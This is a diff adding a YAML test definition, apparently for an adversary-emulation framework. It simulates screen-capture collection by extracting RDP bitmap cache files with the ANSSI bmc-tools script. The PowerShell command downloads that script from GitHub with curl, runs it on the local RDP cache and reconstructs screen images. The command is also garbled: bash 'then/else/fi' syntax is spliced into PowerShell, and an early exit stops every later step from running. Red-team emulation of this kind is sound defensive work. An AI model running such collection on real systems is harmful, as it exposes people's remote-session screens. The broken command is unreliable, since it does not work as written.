@@ -1,0 +1,59 @@
+- id: 98f19852-7348-4f99-9e15-6ff4320464c7
+  name: RDP Bitmap Cache Extraction via bmc-tools
+  description: 'Simulates an attacker extracting the RDP bitmap cache using the ANSSI
+    "bmc-tools.py" script.
+
+    This test requires valid RDP bitmap cache files to exist on the system (usually
+    created after an outgoing RDP connection is made).'
+  tactic: collection
+  technique:
+    attack_id: T1113
+    name: Screen Capture
+  platforms:
+    windows:
+      psh:
+        command: 'if (Get-Command python -ErrorAction SilentlyContinue) { exit 0 }
+          else { exit 1 }; then : ; else Write-Host "Please install Python manually.";
+          fi; $url = ''https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'';
+          $toolsDir = "$env:TEMP\bmc-tools.py"; # create output directory; New-Item
+          -ItemType Directory -Path $env:TEMP\rdp_screens -Force | Out-Null; # python
+          script download; & curl.exe -L $url --output $toolsDir; # execution step;
+          if (Test-Path $toolsDir) { python $toolsDir -s "$env:LOCALAPPDATA\Microsoft\Terminal
+          Server Client\Cache" -d $env:TEMP\rdp_screens -b }'
+        cleanup: 'Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue;
+          Remove-Item #{output_dir} -Recurse -Force -ErrorAction SilentlyContinue'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - collection
+  - t1113
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      cache_path:
+        description: Path to the RDP Cache directory or specific .bmc file
+        type: path
+        default: $env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache
+      output_dir:
+        description: Directory to save reconstructed images
+        type: path
+        default: $env:TEMP\rdp_screens
+    dependencies:
+    - description: 'Python must be installed and in the PATH to run bmc-tools.py
+
+        '
+      prereq_command: 'if (Get-Command python -ErrorAction SilentlyContinue) { exit
+        0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'Write-Host "Please install Python manually."
+
+        '
+    technique_created: '2017-05-31T21:31:25.060Z'
+    atomic_guid: 98f19852-7348-4f99-9e15-6ff4320464c7
+    import_timestamp: '2026-01-07T03:29:31.243917Z'
